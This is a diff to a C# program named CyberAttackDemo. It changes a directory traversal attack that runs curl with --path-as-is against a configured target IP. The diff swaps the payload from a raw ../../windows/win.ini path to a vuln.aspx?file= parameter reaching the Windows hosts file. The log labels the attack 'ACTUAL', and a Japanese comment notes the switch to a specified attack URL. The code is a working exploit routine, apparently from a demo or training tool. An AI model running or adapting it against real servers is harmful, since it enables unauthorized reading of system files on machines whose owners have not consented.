@@ -189,11 +189,13 @@ namespace CyberAttackDemo
             SetBusyState(true, "EXECUTING PATH TRAVERSAL...", Brushes.Red);
             WriteLog("\n==========================================", "system");
             WriteLog($"[*] INITIATING DIRECTORY TRAVERSAL ATTACK (ACTUAL)...", "system");
-            WriteLog("[*] TARGET: Windows IIS (Assumed)", "system");
-            WriteLog("[*] PAYLOAD: ../../../../windows/win.ini", "system");
+            WriteLog("[*] TARGET: Windows IIS / ASP.NET (Assumed)", "system");
+            WriteLog("[*] PAYLOAD: vuln.aspx?file=../../Windows/System32/drivers/etc/hosts", "system");
             WriteLog("==========================================", "system");
 
-            string targetUrl = $"http://{_config.TargetIp}/../../../../windows/win.ini";
+            // 指定された攻撃URLに変更
+            // http://<IP>/vuln.aspx?file=../../Windows/System32/drivers/etc/hosts
+            string targetUrl = $"http://{_config.TargetIp}/vuln.aspx?file=../../Windows/System32/drivers/etc/hosts";
             string args = $"--path-as-is -v --max-time 5 \"{targetUrl}\"";
             
             WriteLog($"[*] Executing: curl {args}", "system");
